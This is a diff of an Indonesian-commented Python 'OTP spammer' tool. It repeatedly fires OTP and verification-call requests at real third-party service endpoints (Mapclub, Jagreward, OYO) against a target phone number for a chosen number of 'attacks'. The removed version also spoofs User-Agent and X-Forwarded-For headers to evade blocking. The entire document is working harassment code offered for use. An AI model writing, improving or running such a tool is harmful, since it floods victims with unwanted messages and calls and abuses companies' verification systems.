@@ -1,88 +1,70 @@
-import requests
-import time
-import random
+import json, requests, time, os, random
 
-# --- DAFTAR USER-AGENT BIAR DIKIRA HP ASLI ---
-UA_LIST = [
-    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"
-]
+# Warna ANSI (Biar Gahar)
+G = '\033[92m'; R = '\033[91m'; W = '\033[97m'; Y = '\033[93m'; B = '\033[94m'
 
-# --- DAFTAR API KHUSUS JALUR WHATSAPP ---
-APIS = [
-    {
-        "name": "Mapclub WA",
-        "url": "https://api.mapclub.com/v1/auth/otp",
-        "method": "POST",
-        "data": {"phone": "{target_full}", "channel": "whatsapp"} 
-    },
-    {
-        "name": "Jagreward Call", 
-        "url": "https://id.jagreward.com/member/verify-mobile/",
-        "method": "POST",
-        "data": {"method": "call", "countryCode": "62", "phoneNumber": "{target_tanpa_62}"}
-    },
-    {
-        "name": "OYO SMS/WA",
-        "url": "https://www.oyorooms.com/api/pwa/generateotp?phone={target_tanpa_62}&country_code=+62",
-        "method": "GET",
-        "data": None
-    }
-]
+def banner():
+    os.system('clear')
+    print(f"{B}╔══════════════════════════════════════════╗")
+    print(f"{B}║{W}       SZN-OTP DISPATCHER PRO v6        {B}║")
+    print(f"{B}║{Y}    Dev: anonymusyogyakarta-coder       {B}║")
+    print(f"{B}╚══════════════════════════════════════════╝{W}\n")
 
-def kirim_wa(target_full, target_tanpa_62, loop, jeda):
-    print(f"\n[!] Target Aktif: {target_full}")
-    print(f"[!] Jalur: WhatsApp & Call Protocol")
-    print("-" * 45)
+def load_api():
+    try:
+        with open('lib/api.json', 'r') as f:
+            return json.load(f)
+    except:
+        print(f"{R}[!] Error: File lib/api.json tidak ditemukan!{W}")
+        return None
+
+def gas_pol(target, total, delay):
+    db = load_api()
+    if not db: return
     
-    for i in range(loop):
-        # Header Palsu biar ga gampang diblokir WiFi
-        headers = {
-            "User-Agent": random.choice(UA_LIST),
-            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-            "Content-Type": "application/json"
-        }
+    # Bersihkan nomor
+    if target.startswith("0"): bersih = target[1:]
+    elif target.startswith("62"): bersih = target[2:]
+    else: bersih = target
+    t_full = "+62" + bersih
+    t_biasa = bersih
+
+    for i in range(total):
+        print(f"{Y}[ Serangan ke-{i+1} ]{W}")
+        # Gabungkan semua API (WA + Call)
+        semua_api = db['whatsapp'] + db['call']
         
-        for api in APIS:
+        for api in semua_api:
             try:
-                url_final = api["url"].format(target_full=target_full, target_tanpa_62=target_tanpa_62)
+                # Format data otomatis
+                u = api['url'].format(target_full=t_full, target_tanpa_62=t_biasa)
+                d = api['data']
+                if d:
+                    for k, v in d.items():
+                        if isinstance(v, str): d[k] = v.format(target_full=t_full, target_tanpa_62=t_biasa)
                 
-                if api["method"] == "POST":
-                    payload = api["data"]
-                    # Format data target di dalam payload
-                    new_payload = {k: v.format(target_full=target_full, target_tanpa_62=target_tanpa_62) if isinstance(v, str) else v for k, v in payload.items()}
-                    r = requests.post(url_final, json=new_payload, headers=headers, timeout=10)
+                headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
+                
+                if api['method'] == "POST":
+                    r = requests.post(u, json=d, headers=headers, timeout=10)
                 else:
-                    r = requests.get(url_final, headers=headers, timeout=10)
+                    r = requests.get(u, headers=headers, timeout=10)
 
                 if r.status_code in [200, 201]:
-                    print(f"[{i+1}] SUCCESS | {api['name']} | OTP OTW!")
+                    print(f"  {G}√ {api['name']}{W} -> OTP Terkirim")
                 else:
-                    print(f"[{i+1}] FAILED  | {api['name']} | Status: {r.status_code} (Limit)")
-                
+                    print(f"  {R}x {api['name']}{W} -> Limit/Gagal")
             except:
-                print(f"[{i+1}] ERROR   | {api['name']} | Server Timeout")
-
+                print(f"  {R}x {api['name']}{W} -> Server Timeout")
             time.sleep(2) # Jeda antar API
             
-        print(f"--- Menunggu {jeda} detik ---")
-        time.sleep(jeda)
+        print(f"{B}--- Menunggu {delay} detik ---{W}\n")
+        time.sleep(delay)
 
-# --- MENU ---
-print("="*45)
-print("     SZN SPAMMER v5 (WHATSAPP SPECIAL)     ")
-print("    Repo: anonymusyogyakarta-coder/tools-szn ")
-print("="*45)
+banner()
+target = input(f"{W}Masukkan Nomor Target: {G}")
+jumlah = int(input(f"{W}Jumlah Serangan: {G}"))
+jeda = int(input(f"{W}Jeda (Detik): {G}"))
 
-inp = input("Nomor Target (Contoh: 0812xxx): ")
-if inp.startswith("0"): bersih = inp[1:]
-elif inp.startswith("62"): bersih = inp[2:]
-else: bersih = inp
-
-target_full = "+62" + bersih
-target_tanpa_62 = bersih
-
-total = int(input("Jumlah Serangan: "))
-wait = int(input("Jeda Detik (Saran: 30): "))
-
-kirim_wa(target_full, target_tanpa_62, total, wait)
+gas_pol(target, jumlah, jeda)
+        
